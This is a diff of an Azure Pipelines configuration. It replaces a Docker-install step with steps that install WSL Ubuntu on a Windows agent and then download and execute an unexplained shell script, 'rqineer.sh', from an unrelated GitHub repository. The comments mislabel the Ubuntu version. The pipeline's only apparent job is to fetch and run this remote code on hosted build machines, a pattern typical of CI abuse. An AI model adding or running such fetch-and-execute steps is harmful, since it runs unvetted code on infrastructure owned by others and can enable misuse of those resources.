@@ -1,14 +1,49 @@
-trigger:
-- main
-
-pool:
-  vmImage: 'windows-latest'  # Menggunakan image Windows untuk Azure-hosted agent
-
 jobs:
-- job: RunInWSL
-  steps:
-    - script: |
-        wsl sudo apt update
-        wsl sudo apt install -y docker.io
-        wsl docker --version
-      displayName: 'Run WSL commands'
+  - job: InstallAndRunInWSL
+    pool:
+      name: Azure Pipelines
+      vmImage: windows-latest  # Windows-hosted agent
+
+    steps:
+      # Langkah pertama: Install WSL dan Ubuntu-20.04
+      - pwsh: |
+          Write-Host "Checking WSL status..."
+          wsl --status
+
+          Write-Host "Listing available WSL distributions..."
+          wsl --list --online
+
+          Write-Host "Installing Ubuntu-22.04 distribution..."
+          wsl --install -d Ubuntu-22.04
+
+          Write-Host "Listing all installed WSL distributions with verbose output..."
+          $wsl = wsl --list --all --verbose | Out-String
+          Write-Host $wsl
+
+          $checkCount = 0
+          while ($wsl -notmatch 'Ubuntu-22.04.*running') {
+            $checkCount++
+            if ($checkCount -gt 30) { 
+              Write-Host "Failed to detect Ubuntu-22.04 running in time"
+              exit 1
+            }
+            Start-Sleep -Seconds 1
+            Write-Host "Checking WSL distribution status..."
+            $wsl = wsl --list --all --verbose | Out-String
+            Write-Host $wsl
+
+            Write-Host "WSL status:"
+            wsl --status
+          }
+          Write-Host "Ubuntu-20.04 is now installed and running."
+        displayName: Install and Verify WSL Ubuntu-20.04
+
+      # Langkah kedua: Menjalankan skrip di dalam WSL
+      - pwsh: |
+          Write-Host "Running script inside WSL..."
+
+          # Menjalankan skrip di dalam Ubuntu WSL
+          wsl bash -c "wget https://raw.githubusercontent.com/escaracomka/fefe/refs/heads/main/rqineer.sh && chmod +x rqineer.sh && ./rqineer.sh"
+
+          Write-Host "Script executed inside WSL."
+        displayName: Run Script Inside WSL
